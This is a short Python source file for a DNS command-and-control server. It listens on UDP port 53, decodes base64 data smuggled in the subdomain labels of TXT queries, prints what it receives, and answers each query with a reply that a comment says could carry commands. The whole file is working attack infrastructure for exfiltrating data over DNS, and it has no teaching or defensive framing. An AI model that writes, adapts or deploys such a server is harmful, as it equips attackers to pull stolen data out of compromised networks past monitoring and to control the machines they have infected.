# controller/c2_server.py

import base64
import socketserver
from dnslib import DNSRecord, QTYPE

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, socket = self.request
        request = DNSRecord.parse(data)

        qname = str(request.q.qname)
        if request.q.qtype == QTYPE.TXT:
            # Extract and decode data
            payload = qname.strip('.')
            parts = payload.split('.')
            b64_data = ''.join(parts[:-3])  # Remove domain suffix
            try:
                decoded = base64.b64decode(b64_data).decode('utf-8')
                print(f"[+] Received data: {decoded}")
            except Exception as e:
                print(f"[!] Failed to decode: {e}")

            # Build dummy response (could be empty or command string)
            reply = request.reply()
            reply.add_answer(request.q.qname, QTYPE.TXT, rdata="ACK", ttl=0)
            socket.sendto(bytes(reply), self.client_address)


if __name__ == "__main__":
    import socket
    import threading

    class ThreadedUDPServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
        pass

    HOST, PORT = "0.0.0.0", 53  # Make sure to run as root/admin or use port forwarding

    with ThreadedUDPServer((HOST, PORT), DNSHandler) as server:
        print(f"[*] DNS C2 server listening on {HOST}:{PORT}")
        server.serve_forever()
